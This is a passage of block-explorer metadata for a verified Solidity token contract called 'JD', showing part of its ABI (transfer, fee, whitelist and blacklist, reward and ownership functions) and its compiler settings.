:\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"progressRewardBlock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"burnfee\",\"type\":\"uint256\"}],\"name\":\"setBuyFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setExcludeHolder\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setFeeWhiteList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setFeeblackList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"setFundAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setHolderCondition\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setHolderRewardCondition\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setNumToSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"progressBlockDebt\",\"type\":\"uint256\"}],\"name\":\"setProgressBlockDebt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"lpDividendFee\",\"type\":\"uint256\"}],\"name\":\"setSellFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setSwapPairList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"setuserLp\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"start\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startTradeBlock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"validTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "JD", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://ce02e57e166046d8c476b5b8c3413b042cf42ce5d2191c47d4926fcb84d4bd9a"}